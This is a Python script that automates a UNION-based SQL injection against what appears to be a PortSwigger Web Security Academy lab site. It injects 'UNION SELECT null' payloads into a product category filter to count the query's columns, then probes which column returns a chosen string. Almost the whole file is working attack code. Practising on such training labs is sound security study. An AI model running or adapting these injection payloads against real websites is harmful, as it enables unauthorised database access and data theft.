import requests
from bs4 import BeautifulSoup


def try_category(category_string):
    url = f'https://{site}/filter?category={category_string}'
    resp = s.get(url)
    if resp.status_code != 200:
        print(f'Error code {resp.status_code} with text: {resp.text}\n')
        return resp
    soup = BeautifulSoup(resp.text, 'html.parser')
    return resp

if __name__ == "__main__":
    site = "acd41f561eb434da803264f500610009.web-security-academy.net"
    category = "Gifts"
    s = requests.Session()
    url = f'https://{site}'
    login_url = f'https://{site}/login'

    url= f'https://{site}/'
    resp = s.get(url)
    soup = BeautifulSoup(resp.text,'html.parser')
    hint_text = soup.find(id='hint').get_text().split("'")[1]
    print(f"Database needs to retrieve the string {hint_text}")

    columns = 0
    for i in range(0, 10):
        pstring = f"{category}' UNION SELECT null"
        nstring = i * ",null"
        qstring = f'{pstring}{nstring} --'
        resp = try_category(qstring)
        if resp.status_code == 200:
            columns = i + 1
            print(f'Number of columns: {columns}')
            break
    
    url= f'https://{site}/'
    resp = s.get(url)
    soup = BeautifulSoup(resp.text,'html.parser')
    hint_text = soup.find(id='hint').get_text().split("'")[1]
    print(f"Database needs to retrieve the string {hint_text}")
    
    resp_one = try_category(f"{category}' UNION SELECT 'akfN17',null,null --")
    resp_two = try_category(f"{category}' UNION SELECT null,'akfN17',null --")
    resp_three = try_category(f"{category}' UNION SELECT null,null,'akfN17' --")

    if resp_one.status_code == 200:
        print(f'Resp_one: {resp_one.status_code} with text: {resp_one.text}\n')
    elif resp_two.status_code == 200:
        print(f'Resp_two: {resp_two.status_code} with text: {resp_two.text}\n')
    elif resp_three.status_code == 200:
        print(f'Resp_three: {resp_three.status_code} with text: {resp_three.text}\n')
    else:
        print("No valid string column found\n")
    